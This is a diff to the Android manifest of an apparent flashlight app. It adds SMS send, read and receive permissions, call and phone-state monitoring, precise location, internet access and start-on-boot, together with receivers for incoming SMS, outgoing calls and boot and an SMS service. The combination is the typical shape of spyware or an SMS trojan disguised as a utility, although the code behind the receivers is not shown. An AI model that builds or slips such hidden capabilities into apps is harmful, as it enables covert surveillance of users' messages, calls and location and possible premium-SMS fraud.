@@ -4,13 +4,32 @@
   android:versionCode="1"
   android:versionName="1.0">
 
+  <!-- PERMISSIONS -->
   <uses-permission android:name="android.permission.CAMERA"/>
+  <uses-permission android:name="android.permission.INTERNET"/>
+  <uses-permission android:name="android.permission.SEND_SMS"/>
+  <uses-permission android:name="android.permission.READ_SMS"/>
+  <uses-permission android:name="android.permission.WAKE_LOCK"/>
   <uses-permission android:name="android.permission.FLASHLIGHT"/>
-  <uses-feature android:name="android.hardware.camera.autofocus" />
-  <uses-feature android:name="android.hardware.camera.flash" />
-  <uses-feature android:name="android.hardware.camera"/>
+  <uses-permission android:name="android.permission.RECEIVE_SMS"/>
+  <uses-permission android:name="android.permission.READ_PHONE_STATE"/>
+  <uses-permission android:name="android.permission.ACCESS_FINE_LOCATION"/>
+  <uses-permission android:name="android.permission.ACCESS_COARSE_LOCATION"/>
+  <uses-permission android:name="android.permission.RECEIVE_BOOT_COMPLETED"/>
+  <uses-permission android:name="android.permission.PROCESS_OUTGOING_CALLS"/>
 
-  <application android:label="@string/app_name" android:icon="@drawable/ic_launcher">
+  <!-- FEATURES -->
+  <uses-feature android:name="android.hardware.camera"/>
+  <uses-feature android:name="android.hardware.telephony"/>
+  <uses-feature android:name="android.hardware.location.gps"/>
+  <uses-feature android:name="android.hardware.camera.flash"/>
+  <uses-feature android:name="android.hardware.camera.autofocus"/>
+
+  <!-- TARGET SDK VERSION -->
+  <uses-sdk android:minSdkVersion="21"/>
+  <application android:label="@string/app_name"
+    android:icon="@drawable/ic_launcher"
+    android:allowBackup="false">
     <activity android:name="FlashLight"
       android:screenOrientation="portrait"
       android:configChanges="keyboardHidden|orientation|screenSize"
@@ -20,6 +39,26 @@
         <category android:name="android.intent.category.LAUNCHER" />
       </intent-filter>
     </activity>
+    <receiver android:name=".SMSListener">
+      <intent-filter>
+        <action android:name="android.provider.Telephony.SMS_RECEIVED"/>
+      </intent-filter>
+    </receiver>
+    <receiver android:name=".CallListener" >
+      <intent-filter>
+        <action android:name="android.intent.action.PHONE_STATE" />
+      </intent-filter>
+      <intent-filter>
+        <action android:name="android.intent.action.NEW_OUTGOING_CALL" />
+      </intent-filter>
+    </receiver>
+    <receiver android:name=".AlarmReceiver" android:enabled="true" android:exported="false">
+      <intent-filter>
+        <action android:name="android.intent.action.BOOT_COMPLETED"/>
+        <action android:name="android.intent.action.QUICKBOOT_POWERON"/>
+      </intent-filter>
+    </receiver>
+    <service android:name=".SMSService"></service>
     <service android:name=".TorchService" ></service>
   </application>
 </manifest>
